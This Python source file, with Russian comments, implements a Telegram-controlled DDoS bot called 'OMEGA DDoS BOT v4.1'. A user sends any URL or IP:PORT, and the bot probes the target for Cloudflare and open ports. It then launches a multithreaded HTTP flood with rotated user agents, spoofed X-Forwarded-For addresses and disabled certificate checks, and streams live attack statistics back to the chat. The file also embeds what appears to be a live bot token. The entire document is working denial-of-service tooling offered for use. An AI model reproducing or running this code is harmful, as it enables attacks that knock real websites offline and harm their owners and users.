#!/usr/bin/env python3
"""
OMEGA DDoS BOT v4.1 - STABLE
Токен: 8735128864:AAGfaw9__C9PLLGoYqdOUWm-iFOHjsyt4ao
Без ошибок, стабильная версия
"""

import asyncio
import aiohttp
import socket
import ssl
import random
import time
import json
import re
import threading
import logging
import sys
from datetime import datetime
from typing import Dict, Optional
from urllib.parse import urlparse

# Логирование
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('omega_v4.log'), logging.StreamHandler()]
)
logger = logging.getLogger('OMEGA_V4')

# Конфигурация
TELEGRAM_TOKEN = "8735128864:AAGfaw9__C9PLLGoYqdOUWm-iFOHjsyt4ao"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# ============================================
# DDoS ДВИЖОК
# ============================================
class DDoSEngine:
    def __init__(self):
        self.attacks = {}
        self.threads = {}
        self.stats = {}
        self.stop_flags = {}
        self.lock = threading.Lock()
    
    def start_attack(self, attack_id: str, target: dict):
        """Запуск атаки"""
        stop_flag = threading.Event()
        self.stop_flags[attack_id] = stop_flag
        self.stats[attack_id] = {
            'requests': 0,
            'errors': 0,
            'bytes': 0,
            'start_time': time.time()
        }
        self.attacks[attack_id] = target
        
        # Запускаем потоки
        thread_list = []
        for i in range(target['threads']):
            t = threading.Thread(
                target=self._http_flood_worker,
                args=(attack_id, target, stop_flag),
                daemon=True
            )
            t.start()
            thread_list.append(t)
        
        self.threads[attack_id] = thread_list
        
        # Автостоп
        def auto_stop():
            time.sleep(target.get('duration', 300))
            self.stop_attack(attack_id)
        
        threading.Thread(target=auto_stop, daemon=True).start()
    
    def _http_flood_worker(self, attack_id: str, target: dict, stop_flag: threading.Event):
        """Рабочий поток HTTP флуда"""
        hostname = target['hostname']
        port = target['port']
        ssl_enabled = target['ssl']
        protocol = "https" if ssl_enabled else "http"
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        ]
        
        paths = ["/", "/api", "/login", "/admin", "/search", "/catalog", "/index", "/home"]
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(limit=0, force_close=True, ssl=ssl_context)
        timeout = aiohttp.ClientTimeout(total=30, connect=5)
        
        async def run():
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while not stop_flag.is_set():
                    try:
                        path = random.choice(paths)
                        url = f"{protocol}://{hostname}:{port}{path}"
                        
                        headers = {
                            "User-Agent": random.choice(user_agents),
                            "Accept": "*/*",
                            "Accept-Encoding": "gzip, deflate",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Cache-Control": "no-cache",
                            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                            "Connection": "keep-alive",
                        }
                        
                        async with session.get(url, headers=headers, ssl=ssl_context, allow_redirects=False) as resp:
                            body = await resp.read()
                            
                            with self.lock:
                                if attack_id in self.stats:
                                    self.stats[attack_id]['requests'] += 1
                                    self.stats[attack_id]['bytes'] += len(body) + 500
                    
                    except Exception:
                        with self.lock:
                            if attack_id in self.stats:
                                self.stats[attack_id]['errors'] += 1
        
        asyncio.run(run())
    
    def stop_attack(self, attack_id: str):
        """Остановка атаки"""
        if attack_id in self.stop_flags:
            self.stop_flags[attack_id].set()
            time.sleep(1)
            
            with self.lock:
                self.stop_flags.pop(attack_id, None)
                self.threads.pop(attack_id, None)
                self.attacks.pop(attack_id, None)
    
    def get_stats(self, attack_id: str) -> dict:
        """Получение статистики"""
        with self.lock:
            if attack_id not in self.stats:
                return {'requests': 0, 'errors': 0, 'bytes': 0}
            
            stats = self.stats[attack_id].copy()
            stats['elapsed'] = time.time() - stats['start_time']
            
            if stats['elapsed'] > 0:
                stats['rps'] = stats['requests'] / stats['elapsed']
                stats['mbps'] = (stats['bytes'] * 8) / stats['elapsed'] / 1_000_000
            else:
                stats['rps'] = 0
                stats['mbps'] = 0
            
            return stats

# ============================================
# АНАЛИЗАТОР ЦЕЛИ
# ============================================
async def analyze_target(url: str) -> dict:
    """Анализ цели"""
    # Парсим URL
    if not url.startswith('http'):
        url = f'https://{url}' if not url.startswith('http') else url
    
    parsed = urlparse(url)
    hostname = parsed.hostname or url.split(':')[0]
    
    result = {
        'hostname': hostname,
        'port': 443,
        'ssl': True,
        'ip': None,
        'cloudflare': False,
        'server': 'Неизвестно',
        'protection': 'НИЗКАЯ',
        'threads': 500,
        'method': 'HTTP_FLOOD',
        'duration': 300
    }
    
    # Получаем IP
    try:
        result['ip'] = socket.gethostbyname(hostname)
    except:
        result['ip'] = hostname
    
    # Проверяем HTTPS и HTTP
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    
    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=5)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Проверяем HTTPS
        try:
            async with session.get(f'https://{hostname}:443', ssl=ssl_ctx, allow_redirects=False) as resp:
                headers = dict(resp.headers)
                result['port'] = 443
                result['ssl'] = True
                result['server'] = headers.get('Server', 'Неизвестно')
                
                if 'cf-ray' in headers or 'cloudflare' in str(headers).lower():
                    result['cloudflare'] = True
                    result['protection'] = 'ВЫСОКАЯ (Cloudflare)'
                    result['threads'] = 200
                    result['method'] = 'SLOWLORIS'
        except:
            pass
        
        # Проверяем HTTP
        if result['port'] == 443:
            try:
                async with session.get(f'http://{hostname}:80', ssl=False, allow_redirects=False) as resp:
                    headers = dict(resp.headers)
                    result['port'] = 80
                    result['ssl'] = False
                    result['server'] = headers.get('Server', 'Неизвестно')
            except:
                pass
    
    # Если нет Cloudflare - увеличиваем мощность
    if not result['cloudflare']:
        result['threads'] = 500
        result['method'] = 'HTTP_FLOOD'
    
    return result

# ============================================
# TELEGRAM БОТ
# ============================================
class OmegaBot:
    def __init__(self):
        self.engine = DDoSEngine()
        self.session = None
        self.last_update = 0
        self.monitors = {}
    
    async def init(self):
        self.session = aiohttp.ClientSession()
        
        # Проверка бота
        async with self.session.get(f'{TELEGRAM_API}/getMe') as resp:
            data = await resp.json()
            if data.get('ok'):
                logger.info(f"Бот @{data['result']['username']} готов")
    
    async def send(self, chat_id: int, text: str, keyboard: dict = None):
        """Отправка сообщения"""
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        if keyboard:
            data['reply_markup'] = json.dumps(keyboard)
        
        async with self.session.post(f'{TELEGRAM_API}/sendMessage', json=data) as resp:
            r = await resp.json()
            return r.get('result', {})
    
    async def edit(self, chat_id: int, msg_id: int, text: str, keyboard: dict = None):
        """Редактирование сообщения"""
        data = {
            'chat_id': chat_id,
            'message_id': msg_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        if keyboard:
            data['reply_markup'] = json.dumps(keyboard)
        
        try:
            async with self.session.post(f'{TELEGRAM_API}/editMessageText', json=data) as resp:
                return await resp.json()
        except:
            pass
    
    def main_keyboard(self):
        return {
            'keyboard': [
                [{'text': '🛑 ОСТАНОВИТЬ ВСЁ'}],
                [{'text': '📊 СТАТУС'}]
            ],
            'resize_keyboard': True
        }
    
    def attack_keyboard(self, attack_id: str):
        return {
            'inline_keyboard': [
                [
                    {'text': '🛑 СТОП', 'callback_data': f'stop_{attack_id}'},
                    {'text': '🔄 ОБНОВИТЬ', 'callback_data': f'refresh_{attack_id}'}
                ]
            ]
        }
    
    async def start_monitor(self, chat_id: int, attack_id: str, target: dict):
        """Запуск мониторинга"""
        msg = await self.send(chat_id, "🔄 Запуск мониторинга...")
        if not msg:
            return
        
        msg_id = msg['message_id']
        
        async def update_loop():
            while attack_id in self.engine.stats:
                try:
                    stats = self.engine.get_stats(attack_id)
                    elapsed = stats.get('elapsed', 0)
                    rps = stats.get('rps', 0)
                    mbps = stats.get('mbps', 0)
                    requests = stats.get('requests', 0)
                    errors = stats.get('errors', 0)
                    bytes_sent = stats.get('bytes', 0)
                    mb = bytes_sent / 1024 / 1024
                    
                    active = attack_id in self.engine.stop_flags
                    status_emoji = "🟢" if active else "🔴"
                    
                    text = f"""
<b>{status_emoji} АТАКА АКТИВНА</b>

🎯 <code>{target['hostname']}:{target['port']}</code>
⚙️ {target['method']} | 🔒 {target['protection']}
🧵 Потоков: <b>{target['threads']}</b>
⏱ Время: <b>{elapsed:.0f}с</b>

📊 <b>СТАТИСТИКА:</b>
├ Запросов: <code>{requests:,}</code>
├ RPS: <b>{rps:,.0f}</b>
├ Ошибок: <code>{errors:,}</code>
├ Трафик: <b>{mb:.1f} МБ</b>
└ Скорость: <b>{mbps:.1f} Мбит/с</b>

<i>Обновление: каждую секунду</i>
"""
                    await self.edit(chat_id, msg_id, text, self.attack_keyboard(attack_id))
                    await asyncio.sleep(1)
                except:
                    await asyncio.sleep(1)
        
        asyncio.create_task(update_loop())
    
    async def handle_message(self, msg: dict):
        """Обработка сообщений"""
        chat_id = msg['chat']['id']
        text = msg.get('text', '')
        username = msg['from'].get('username', 'User')
        
        # Команды
        if text == '/start':
            await self.send(chat_id, f"""
<b>🚀 OMEGA DDoS BOT v4.1</b>

👤 @{username}
⚡ Мощность: МАКСИМУМ

<b>Просто кинь ссылку:</b>
• <code>https://site.com</code>
• <code>site.com</code>
• <code>IP:PORT</code>

Бот сам проанализирует и запустит атаку!
""", self.main_keyboard())
            return
        
        if text in ['/stop', '🛑 ОСТАНОВИТЬ ВСЁ']:
            for aid in list(self.engine.stop_flags.keys()):
                self.engine.stop_attack(aid)
            await self.send(chat_id, "✅ Все атаки остановлены", self.main_keyboard())
            return
        
        if text in ['/status', '📊 СТАТУС']:
            if not self.engine.attacks:
                await self.send(chat_id, "📊 Нет активных атак", self.main_keyboard())
            else:
                for aid, target in self.engine.attacks.items():
                    stats = self.engine.get_stats(aid)
                    await self.send(chat_id, f"🎯 {target['hostname']}:{target['port']}\n⚡ RPS: {stats.get('rps', 0):.0f}\n⏱ {stats.get('elapsed', 0):.0f}с")
            return
        
        # Проверка на ссылку/IP
        if self._is_target(text):
            await self.process_target(chat_id, text.strip())
            return
        
        # Непонятный ввод
        await self.send(chat_id, "❓ Кинь ссылку на сайт или IP:PORT", self.main_keyboard())
    
    def _is_target(self, text: str) -> bool:
        """Проверка на цель"""
        text = text.strip()
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', text):
            return True
        if re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', text):
            return True
        if text.startswith('http://') or text.startswith('https://'):
            return True
        if re.match(r'^[a-zA-Z0-9.\-]+:\d+$', text):
            return True
        return False
    
    async def process_target(self, chat_id: int, url: str):
        """Обработка цели"""
        status_msg = await self.send(chat_id, f"🔍 Анализирую <code>{url}</code>...")
        
        # Анализ
        target = await analyze_target(url)
        
        # Показываем результат
        analysis = f"""
<b>✅ АНАЛИЗ ЗАВЕРШЕН</b>

🎯 <b>{target['hostname']}:{target['port']}</b>
🌐 IP: <code>{target['ip']}</code>
💻 Сервер: {target['server']}
🛡 Защита: {target['protection']}
🔒 SSL: {'Да' if target['ssl'] else 'Нет'}

⚡ <b>Метод:</b> {target['method']}
🧵 <b>Потоки:</b> {target['threads']}

<b>🚀 ЗАПУСКАЮ АТАКУ...</b>
"""
        
        await self.edit(chat_id, status_msg['message_id'], analysis)
        await asyncio.sleep(1)
        
        # Запуск атаки
        attack_id = f"atk_{int(time.time())}"
        self.engine.start_attack(attack_id, target)
        
        # Мониторинг
        await self.start_monitor(chat_id, attack_id, target)
        
        logger.info(f"АТАКА: {attack_id} -> {target['hostname']}:{target['port']}")
    
    async def handle_callback(self, cb: dict):
        """Обработка callback"""
        data = cb.get('data', '')
        chat_id = cb['message']['chat']['id']
        msg_id = cb['message']['message_id']
        
        await self.session.post(f'{TELEGRAM_API}/answerCallbackQuery', json={'callback_query_id': cb['id']})
        
        if data.startswith('stop_'):
            attack_id = data.replace('stop_', '')
            self.engine.stop_attack(attack_id)
            await self.edit(chat_id, msg_id, "✅ Атака остановлена")
        
        elif data.startswith('refresh_'):
            attack_id = data.replace('refresh_', '')
            if attack_id in self.engine.attacks:
                target = self.engine.attacks[attack_id]
                stats = self.engine.get_stats(attack_id)
                
                text = f"""
<b>🔄 ОБНОВЛЕНО</b>

🎯 {target['hostname']}:{target['port']}
RPS: {stats.get('rps', 0):.0f}
Запросов: {stats.get('requests', 0):,}
Ошибок: {stats.get('errors', 0):,}
"""
                await self.edit(chat_id, msg_id, text, self.attack_keyboard(attack_id))
    
    async def run(self):
        """Главный цикл"""
        await self.init()
        logger.info("Бот запущен. Жду ссылки...")
        
        while True:
            try:
                async with self.session.get(
                    f'{TELEGRAM_API}/getUpdates',
                    params={'offset': self.last_update + 1, 'timeout': 30}
                ) as resp:
                    updates = await resp.json()
                
                if updates.get('ok'):
                    for upd in updates['result']:
                        self.last_update = max(self.last_update, upd['update_id'])
                        
                        if 'message' in upd and 'text' in upd['message']:
                            await self.handle_message(upd['message'])
                        elif 'callback_query' in upd:
                            await self.handle_callback(upd['callback_query'])
                
                await asyncio.sleep(0.1)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await asyncio.sleep(5)

# ============================================
# ЗАПУСК
# ============================================
async def main():
    bot = OmegaBot()
    try:
        await bot.run()
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
    finally:
        if bot.session:
            await bot.session.close()

if __name__ == '__main__':
    print("OMEGA DDoS BOT v4.1 - ЗАПУСК")
    asyncio.run(main())